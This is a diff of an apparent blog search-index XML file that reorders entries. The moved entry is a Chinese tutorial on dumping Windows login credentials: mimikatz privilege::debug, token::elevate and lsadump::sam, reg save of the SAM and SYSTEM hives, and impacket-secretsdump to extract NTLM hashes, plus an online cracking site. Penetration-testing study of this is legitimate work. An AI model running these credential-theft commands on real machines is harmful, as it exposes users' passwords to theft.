@@ -4,31 +4,6 @@
   
     
     <entry>
-      <title>Windows登陆密码获取</title>
-      <link href="/2026/04/28/GetWindowskey/"/>
-      <url>/2026/04/28/GetWindowskey/</url>
-      
-        <content type="html"><![CDATA[<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="开启mimikatz。以管理员权限打开cmd，进入目录下"><a href="#开启mimikatz。以管理员权限打开cmd，进入目录下" class="headerlink" title="开启mimikatz。以管理员权限打开cmd，进入目录下"></a>开启mimikatz。以管理员权限打开cmd，进入目录下</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure><p>（如果出现以下报错：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 说明你不是管理员权限）</p><h3 id="提权至-NT-AUTHORITY-SYSTEM"><a href="#提权至-NT-AUTHORITY-SYSTEM" class="headerlink" title="提权至 NT AUTHORITY\SYSTEM"></a>提权至 NT AUTHORITY\SYSTEM</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token::elevate</span><br></pre></td></tr></table></figure><h3 id="获取到NTLM的hash"><a href="#获取到NTLM的hash" class="headerlink" title="获取到NTLM的hash"></a>获取到NTLM的hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h3 id="NTLM解密"><a href="#NTLM解密" class="headerlink" title="NTLM解密"></a>NTLM解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cmd5.com</span><br></pre></td></tr></table></figure><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><h3 id="获取加密哈希值"><a href="#获取加密哈希值" class="headerlink" title="获取加密哈希值"></a>获取加密哈希值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam Q:\sam.hive</span><br></pre></td></tr></table></figure><h3 id="获取密钥文件"><a href="#获取密钥文件" class="headerlink" title="获取密钥文件"></a>获取密钥文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system Q:\system.hive</span><br></pre></td></tr></table></figure><h3 id="分析sam文件，提取NTLM-Hash"><a href="#分析sam文件，提取NTLM-Hash" class="headerlink" title="分析sam文件，提取NTLM Hash"></a>分析sam文件，提取NTLM Hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> MISC </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> NTLM hash </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>FRP内网穿透_实例</title>
       <link href="/2026/04/28/FRP_case/"/>
       <url>/2026/04/28/FRP_case/</url>
@@ -46,6 +21,31 @@
         <tags>
             
             <tag> web security </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows登陆密码获取</title>
+      <link href="/2026/04/28/GetWindowskey/"/>
+      <url>/2026/04/28/GetWindowskey/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="开启mimikatz。以管理员权限打开cmd，进入目录下"><a href="#开启mimikatz。以管理员权限打开cmd，进入目录下" class="headerlink" title="开启mimikatz。以管理员权限打开cmd，进入目录下"></a>开启mimikatz。以管理员权限打开cmd，进入目录下</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure><p>（如果出现以下报错：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 说明你不是管理员权限）</p><h3 id="提权至-NT-AUTHORITY-SYSTEM"><a href="#提权至-NT-AUTHORITY-SYSTEM" class="headerlink" title="提权至 NT AUTHORITY\SYSTEM"></a>提权至 NT AUTHORITY\SYSTEM</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token::elevate</span><br></pre></td></tr></table></figure><h3 id="获取到NTLM的hash"><a href="#获取到NTLM的hash" class="headerlink" title="获取到NTLM的hash"></a>获取到NTLM的hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h3 id="NTLM解密"><a href="#NTLM解密" class="headerlink" title="NTLM解密"></a>NTLM解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cmd5.com</span><br></pre></td></tr></table></figure><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><h3 id="获取加密哈希值"><a href="#获取加密哈希值" class="headerlink" title="获取加密哈希值"></a>获取加密哈希值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam Q:\sam.hive</span><br></pre></td></tr></table></figure><h3 id="获取密钥文件"><a href="#获取密钥文件" class="headerlink" title="获取密钥文件"></a>获取密钥文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system Q:\system.hive</span><br></pre></td></tr></table></figure><h3 id="分析sam文件，提取NTLM-Hash"><a href="#分析sam文件，提取NTLM-Hash" class="headerlink" title="分析sam文件，提取NTLM Hash"></a>分析sam文件，提取NTLM Hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> MISC </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> NTLM hash </tag>
             
         </tags>
       
